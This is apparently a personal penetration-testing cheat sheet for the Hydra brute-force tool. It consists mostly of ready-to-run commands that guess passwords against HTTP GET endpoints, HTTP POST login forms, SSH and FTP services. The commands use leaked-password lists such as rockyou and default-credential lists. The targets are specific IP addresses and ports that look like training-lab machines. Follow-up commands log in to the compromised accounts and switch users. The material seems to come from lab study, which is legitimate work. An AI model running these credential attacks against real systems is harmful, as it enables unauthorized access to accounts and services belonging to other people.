Online brute forcing tool.

---
### Basic Usage
Using a wordlist:
```bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.62.19.68 -s 30905 http-get /
```

We can use the `-L` flag for the usernames wordlist and the `-P` flag for the passwords wordlist. Since we don't want to brute force all the usernames in combination with the passwords in the lists, we can tell `hydra` to stop after the first successful login by specifying the flag `-f`. The `-C` flag is for credential username:password combinations. The `-u` flag tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.

```bash
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

Example of static password brute force with username list:
```bash
hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```

Post-form request examples:
```bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

```bash
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

Using custom generated usernames/passwords with [[CUPP]]
```bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

### Attacking local FTP
Brute force login credentials
```bash
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```
Login to FTP
```bash
ftp 127.0.0.1
```
Switch user
```bash
su - m.gates
```
___
### Attacking SSH
```bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```
Connect
```bash
ssh b.gates@178.35.49.134 -p 22
```
___
### Wordlists
```bash
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
/opt/useful/SecLists/Usernames/Names/names.txt
```


---


